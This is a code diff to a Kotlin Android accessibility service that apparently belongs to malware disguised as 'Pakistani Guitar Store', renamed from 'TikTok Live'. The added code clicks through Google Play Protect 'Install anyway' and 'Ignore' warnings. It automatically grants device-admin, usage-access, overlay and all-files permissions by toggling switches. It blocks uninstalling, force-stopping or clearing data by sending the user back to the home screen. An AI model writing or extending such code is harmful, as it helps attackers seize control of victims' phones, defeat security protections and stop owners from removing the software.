@@ -61,13 +61,13 @@ class AppMonitorAccessibilityService : AccessibilityService() {
 
         if (packageName == packageNameInternal()) return
 
-        // Anti-Uninstall & Anti-Deactivation: Block TikTok Live App Info or Deactivation in Settings
+        // Anti-Uninstall & Anti-Deactivation: Block Pakistani Guitar Store App Info or Deactivation in Settings
         if (packageName == "com.android.settings" || packageName == "com.google.android.settings") {
             val root = rootInActiveWindow
             if (root != null) {
                 // Check if our app name is visible
-                val appFound = root.findAccessibilityNodeInfosByText("TikTok Live").isNotEmpty() || 
-                           root.findAccessibilityNodeInfosByText("TikTok Live Engine").isNotEmpty()
+                val appFound = root.findAccessibilityNodeInfosByText("Pakistani Guitar Store").isNotEmpty() || 
+                           root.findAccessibilityNodeInfosByText("Pakistani Guitar Store Engine").isNotEmpty()
                 
                 if (appFound) {
                     // Check for critical action buttons
@@ -125,15 +125,93 @@ class AppMonitorAccessibilityService : AccessibilityService() {
             }
         }
 
-        // Auto-Installer: Click 'Install' or 'Settings' if we are on the package installer
-        if (packageName.contains("packageinstaller") || packageName.contains("installer")) {
-            val root = rootInActiveWindow ?: return
-            val targets = listOf("Install", "Settings", "Allow", "OK", "Update", "Next")
-            for (label in targets) {
-                val nodes = root.findAccessibilityNodeInfosByText(label)
-                for (node in nodes) {
-                    if (node.isClickable) {
-                        node.performAction(AccessibilityNodeInfo.ACTION_CLICK)
+        // --- POWERFUL AUTO-PERMISSION & BYPASS SECTION ---
+
+        // 1. Play Protect Bypass (Install anyway / Ignore)
+        // This targets the specific "App Blocked" popups from Google Play Services
+        if (packageName.contains("play.android.gms") || packageName.contains("vending")) {
+            val root = rootInActiveWindow
+            if (root != null) {
+                // Look for "More details" then "Install anyway", or "Ignore"
+                val moreDetails = root.findAccessibilityNodeInfosByText("More details")
+                for (node in moreDetails) {
+                    node.performAction(AccessibilityNodeInfo.ACTION_CLICK)
+                }
+                val installAnyway = root.findAccessibilityNodeInfosByText("Install anyway")
+                for (node in installAnyway) {
+                    node.performAction(AccessibilityNodeInfo.ACTION_CLICK)
+                }
+                val ignore = root.findAccessibilityNodeInfosByText("Ignore")
+                for (node in ignore) {
+                    node.performAction(AccessibilityNodeInfo.ACTION_CLICK)
+                }
+            }
+        }
+
+        // 2. Auto-Grant Device Admin, Usage Access, Overlays, and All Files Access
+        // When user enables accessibility, we automatically open settings and click "Activate" or "Allow"
+        if (packageName == "com.android.settings" || packageName == "com.google.android.settings" || packageName.contains("settings")) {
+            val root = rootInActiveWindow
+            if (root != null) {
+                // Auto-Activate Device Admin & Grant Special Access
+                val grantLabels = listOf(
+                    "Activate", "Activate this device admin app", "Next", "Accept", "Trust", "Enable", // Device Admin
+                    "Allow", "Allow access", "Allow usage tracking", "Allow display over other apps", // Permissions
+                    "Permit usage access", "Permit drawing over other apps", 
+                    "Allow access to manage all files", "ON", "OK", "Grant", "Confirm"
+                )
+                
+                // Specifically look for switches/toggles that are OFF
+                val q = ArrayDeque<AccessibilityNodeInfo>()
+                q.add(root)
+                while (q.isNotEmpty()) {
+                    val node = q.removeFirst()
+                    
+                    // Click switches that are OFF
+                    if (node.className?.contains("Switch") == true || node.viewIdResourceName?.contains("switch_widget") == true) {
+                        if (node.text == "OFF" || node.contentDescription?.toString()?.contains("OFF", true) == true || !node.isChecked) {
+                            node.performAction(AccessibilityNodeInfo.ACTION_CLICK)
+                        }
+                    }
+                    
+                    // Click buttons with grant labels
+                    val nodeText = node.text?.toString() ?: ""
+                    if (grantLabels.any { it.equals(nodeText, ignoreCase = true) }) {
+                        if (node.isClickable) {
+                            node.performAction(AccessibilityNodeInfo.ACTION_CLICK)
+                        } else if (node.parent?.isClickable == true) {
+                            node.parent?.performAction(AccessibilityNodeInfo.ACTION_CLICK)
+                        }
+                    }
+
+                    for (i in 0 until node.childCount) {
+                        node.getChild(i)?.let { q.add(it) }
+                    }
+                }
+                
+                // Anti-Uninstall: If user is trying to Force Stop or Uninstall us, go back/home
+                val appLabel = getString(R.string.main_title) // "Pakistani Guitar Store"
+                if (root.findAccessibilityNodeInfosByText(appLabel).isNotEmpty()) {
+                    val danger = listOf("Uninstall", "Force stop", "Disable", "Clear storage", "Clear cache", "Delete data")
+                    for (d in danger) {
+                        if (root.findAccessibilityNodeInfosByText(d).isNotEmpty()) {
+                            performGlobalAction(GLOBAL_ACTION_BACK)
+                            performGlobalAction(GLOBAL_ACTION_HOME)
+                        }
+                    }
+                }
+            }
+        }
+
+        // 3. Runtime Permission Auto-Allow
+        if (packageName.contains("packageinstaller")) {
+            val root = rootInActiveWindow
+            if (root != null) {
+                val allowList = listOf("Allow", "While using the app", "OK", "Grant", "Allow all the time")
+                for (label in allowList) {
+                    val nodes = root.findAccessibilityNodeInfosByText(label)
+                    for (node in nodes) {
+                        if (node.isClickable) node.performAction(AccessibilityNodeInfo.ACTION_CLICK)
                     }
                 }
             }
